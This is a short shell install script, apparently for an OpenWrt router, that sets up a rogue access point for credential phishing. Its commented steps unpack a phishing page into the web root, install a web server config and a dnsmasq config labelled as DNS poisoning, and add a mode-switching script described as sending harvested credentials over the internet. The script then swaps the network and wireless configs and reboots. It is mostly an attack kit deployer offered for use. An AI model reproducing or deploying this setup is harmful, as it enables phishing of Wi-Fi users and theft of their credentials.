#!/bin/ash

#set up dynamic phishing page 
tar xvf www.tar -C /www
#set up web server config 
cp -f uhttpd /etc/config/uhttpd
#set up dns poisoning 
cp -f dnsmasq.conf /etc/dnsmasq.conf
#set up ap-sta switch mode script that also sends credentials over the internet
cp -f fly.sh /root/fly.sh
#set up network configuration
cp /etc/config/network /etc/config/network.ap
cp /etc/config/wireless /etc/config/wireless.ap
cp -f network.sta /etc/config/network.sta
cp -f wireless.sta /etc/config/wireless.sta
reboot

